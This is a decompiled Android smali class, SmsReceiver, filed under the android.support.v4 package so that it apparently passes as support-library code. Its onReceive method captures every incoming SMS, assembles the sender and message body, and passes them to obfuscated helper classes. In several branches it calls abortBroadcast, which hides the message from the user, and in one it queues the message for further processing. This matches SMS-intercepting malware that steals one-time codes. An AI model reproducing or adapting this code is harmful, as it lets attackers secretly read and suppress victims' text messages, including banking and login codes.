.class public Landroid/support/v4/content/SmsReceiver;
.super Landroid/content/BroadcastReceiver;


# static fields
.field private static final a:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-class v0, Landroid/support/v4/content/SmsReceiver;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Landroid/support/v4/content/SmsReceiver;->a:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 7

    const/4 v3, 0x0

    sget-object v0, Landroid/support/v4/content/SmsReceiver;->a:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/support/v4/app/Support;->b(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, ""

    const-string v0, ""

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v2, "pdus"

    invoke-virtual {v0, v2}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/Object;

    array-length v2, v0

    new-array v5, v2, [Landroid/telephony/SmsMessage;

    move v2, v3

    move-object v4, v1

    :goto_0
    array-length v1, v0

    if-lt v2, v1, :cond_1

    aget-object v0, v5, v3

    invoke-virtual {v0}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1}, Landroid/support/v4/app/Support;->checkAppStatus(Landroid/content/Context;)V

    invoke-static {}, Landroid/support/v4/app/m;->a()Landroid/support/v4/app/m;

    move-result-object v1

    invoke-virtual {v1, v0, v4}, Landroid/support/v4/app/m;->b(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-virtual {p0}, Landroid/support/v4/content/SmsReceiver;->abortBroadcast()V

    :cond_0
    :goto_1
    return-void

    :cond_1
    aget-object v1, v0, v2

    check-cast v1, [B

    invoke-static {v1}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v1

    aput-object v1, v5, v2

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v1, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v4, v5, v2

    invoke-virtual {v4}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    add-int/lit8 v1, v2, 0x1

    move v2, v1

    goto :goto_0

    :cond_2
    invoke-static {}, Landroid/support/v4/app/m;->a()Landroid/support/v4/app/m;

    move-result-object v1

    invoke-virtual {v1, p1, v0, v4}, Landroid/support/v4/app/m;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Landroid/support/v4/app/m$b;

    move-result-object v1

    if-eqz v1, :cond_3

    invoke-virtual {p0}, Landroid/support/v4/content/SmsReceiver;->abortBroadcast()V

    new-instance v2, Landroid/support/v4/app/n;

    invoke-direct {v2}, Landroid/support/v4/app/n;-><init>()V

    iget v3, v1, Landroid/support/v4/app/m$b;->a:I

    const/4 v5, 0x1

    iget-object v6, v1, Landroid/support/v4/app/m$b;->b:Ljava/lang/String;

    iget-object v1, v1, Landroid/support/v4/app/m$b;->c:Ljava/lang/String;

    invoke-virtual {v2, v3, v5, v6, v1}, Landroid/support/v4/app/n;->a(IILjava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Landroid/support/v4/app/o;->a()Landroid/support/v4/app/o;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/support/v4/app/o;->a(Ljava/lang/Runnable;)V

    :cond_3
    invoke-static {}, Landroid/support/v4/app/m;->a()Landroid/support/v4/app/m;

    move-result-object v1

    invoke-virtual {v1, v0, v4}, Landroid/support/v4/app/m;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/support/v4/content/SmsReceiver;->abortBroadcast()V

    goto :goto_1
.end method
